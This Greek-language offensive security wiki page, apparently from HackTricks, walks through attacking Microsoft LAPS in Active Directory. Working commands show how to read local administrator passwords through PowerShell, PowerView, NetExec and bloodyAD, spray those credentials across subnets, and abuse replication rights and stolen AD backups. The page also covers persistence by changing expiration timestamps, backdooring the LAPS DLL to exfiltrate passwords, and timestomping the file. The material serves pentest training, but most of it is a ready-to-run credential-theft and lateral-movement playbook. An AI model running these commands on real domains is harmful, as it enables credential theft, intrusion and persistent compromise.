# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

Υπάρχουν αυτή τη στιγμή **2 LAPS flavours** που μπορεί να συναντήσεις κατά τη διάρκεια ενός assessment:

- **Legacy Microsoft LAPS**: αποθηκεύει τον local administrator password στο **`ms-Mcs-AdmPwd`** και τον χρόνο λήξης στο **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ενσωματωμένο στο Windows από τα April 2023 updates): μπορεί ακόμα να emulates legacy mode, αλλά σε native mode χρησιμοποιεί **`msLAPS-*`** attributes, υποστηρίζει **password encryption**, **password history**, και **DSRM password backup** για domain controllers.

Το LAPS είναι σχεδιασμένο για να διαχειρίζεται **local administrator passwords**, κάνοντάς τα **unique, randomized, and frequently changed** σε domain-joined computers. Αν μπορείς να διαβάσεις αυτά τα attributes, συνήθως μπορείς να **pivot as the local admin** στο affected host. Σε πολλά environments, το ενδιαφέρον δεν είναι μόνο να διαβάσεις το ίδιο το password, αλλά και να βρεις **who was delegated access** στα password attributes.

### Legacy Microsoft LAPS attributes

Στα computer objects του domain, η υλοποίηση του legacy Microsoft LAPS έχει ως αποτέλεσμα την προσθήκη δύο attributes:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Το native Windows LAPS προσθέτει αρκετά νέα attributes στα computer objects:

- **`msLAPS-Password`**: clear-text password blob αποθηκευμένο ως JSON όταν η encryption δεν είναι enabled
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data για domain controllers
- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking που χρησιμοποιείται από νεότερη rollback-detection logic (Windows Server 2025 forest schema)

Όταν το **`msLAPS-Password`** είναι readable, η τιμή είναι ένα JSON object που περιέχει το account name, τον update time και το clear-text password, για παράδειγμα:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Ελέγξτε αν είναι ενεργοποιημένο
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Πρόσβαση κωδικού LAPS

Μπορείς να **κατεβάσεις το raw LAPS policy** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσεις το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψεις αυτό το αρχείο σε μορφή που διαβάζεται από άνθρωπο.

### Legacy Microsoft LAPS PowerShell cmdlets

Αν είναι εγκατεστημένο το legacy LAPS module, τα ακόλουθα cmdlets είναι συνήθως διαθέσιμα:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Το Native Windows LAPS έρχεται με ένα νέο PowerShell module και νέα cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Μερικές λειτουργικές λεπτομέρειες έχουν σημασία εδώ:

- Το **`Get-LapsADPassword`** χειρίζεται αυτόματα το **legacy LAPS**, το **clear-text Windows LAPS**, και το **encrypted Windows LAPS**.
- Αν το password είναι encrypted και μπορείς να το **read** αλλά όχι να το **decrypt**, το cmdlet επιστρέφει metadata αλλά όχι το clear-text password.
- Το **Password history** είναι διαθέσιμο μόνο όταν είναι ενεργοποιημένο το **Windows LAPS encryption**.
- Σε domain controllers, η returned source μπορεί να είναι **`EncryptedDSRMPassword`**.

### PowerView / LDAP

Το **PowerView** μπορεί επίσης να χρησιμοποιηθεί για να βρεθεί **who can read the password and read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Αν το **`msLAPS-Password`** είναι αναγνώσιμο, κάνε parse το επιστρεφόμενο JSON και εξήγαγε το **`p`** για τον κωδικό πρόσβασης και το **`n`** για το όνομα του managed local admin account.

### Linux / remote tooling

Τα σύγχρονα εργαλεία υποστηρίζουν τόσο το legacy Microsoft LAPS όσο και το Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Σημειώσεις:

- Πρόσφατες εκδόσεις **NetExec** υποστηρίζουν τα **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, και **`msLAPS-EncryptedPassword`**.
- Το **`pyLAPS`** εξακολουθεί να είναι χρήσιμο για το **legacy Microsoft LAPS** από Linux, αλλά στοχεύει μόνο το **`ms-Mcs-AdmPwd`**.
- Αν το περιβάλλον χρησιμοποιεί **encrypted Windows LAPS**, ένα απλό LDAP read δεν αρκεί· πρέπει επίσης να είσαι **authorized decryptor** ή να εκμεταλλευτείς ένα υποστηριζόμενο decrypt path.

### Directory synchronization abuse

Αν έχεις δικαιώματα **directory synchronization** σε επίπεδο domain αντί για άμεση πρόσβαση ανά computer object, το LAPS μπορεί να παραμένει ενδιαφέρον.

Ο συνδυασμός των **`DS-Replication-Get-Changes`** με **`DS-Replication-Get-Changes-In-Filtered-Set`** ή **`DS-Replication-Get-Changes-All`** μπορεί να χρησιμοποιηθεί για να συγχρονίσει **confidential / RODC-filtered** attributes όπως το legacy **`ms-Mcs-AdmPwd`**. Το BloodHound το μοντελοποιεί αυτό ως **`SyncLAPSPassword`**. Δες το [DCSync](dcsync.md) για το υπόβαθρο των replication-rights.

## LAPSToolkit

Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την απαρίθμηση του LAPS με αρκετές functions.\
Μία είναι το parsing των **`ExtendedRights`** για **όλα τα computers με ενεργοποιημένο LAPS.** Αυτό δείχνει **groups** που έχουν ειδικά **delegated to read LAPS passwords**, τα οποία συχνά είναι users σε protected groups.\
Ένας **account** που έχει **joined a computer** σε ένα domain λαμβάνει `All Extended Rights` πάνω σε αυτό το host, και αυτό το right δίνει στον **account** τη δυνατότητα να **read passwords**. Η enumeration μπορεί να δείξει ένα user account που μπορεί να διαβάσει το LAPS password σε έναν host. Αυτό μπορεί να μας βοηθήσει να **target specific AD users** που μπορούν να διαβάσουν LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Αν δεν έχετε ένα διαδραστικό PowerShell, μπορείτε να καταχραστείτε αυτό το privilege απομακρυσμένα μέσω LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Αυτό κάνει dump όλα τα LAPS secrets που μπορεί να διαβάσει ο χρήστης, επιτρέποντάς σου να κινηθείς lateral με διαφορετικό local administrator password.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Ημερομηνία Λήξης

Μόλις αποκτηθεί admin, είναι δυνατό να **obtain the passwords** και να **prevent** ένα μηχάνημα από το να **updating** τον **password** του, **setting the expiration date into the future**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Το Native Windows LAPS χρησιμοποιεί **`msLAPS-PasswordExpirationTime`** αντί:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Ο κωδικός πρόσβασης θα εξακολουθήσει να περιστρέφεται αν ένας **admin** χρησιμοποιήσει **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ή αν είναι ενεργοποιημένο το **Do not allow password expiration time longer than required by policy**.

### Ανάκτηση ιστορικών κωδικών πρόσβασης από AD backups

Όταν είναι ενεργοποιημένο το **Windows LAPS encryption + password history**, τα mounted AD backups μπορούν να γίνουν μια επιπλέον πηγή secrets. Αν μπορείτε να προσπελάσετε ένα mounted AD snapshot και να χρησιμοποιήσετε **recovery mode**, μπορείτε να κάνετε query παλαιότερους αποθηκευμένους κωδικούς πρόσβασης χωρίς να μιλάτε σε ένα live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Αυτό είναι κυρίως σχετικό κατά το **AD backup theft**, **offline forensics abuse**, ή **disaster-recovery media access**.

### Backdoor

Ο αρχικός πηγαίος κώδικας για το legacy Microsoft LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατό να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που με κάποιον τρόπο θα **exfiltrate new passwords or store them somewhere**.

Έπειτα, κάντε compile το νέο `AdmPwd.PS.dll` και ανεβάστε το στο μηχάνημα στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε το modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
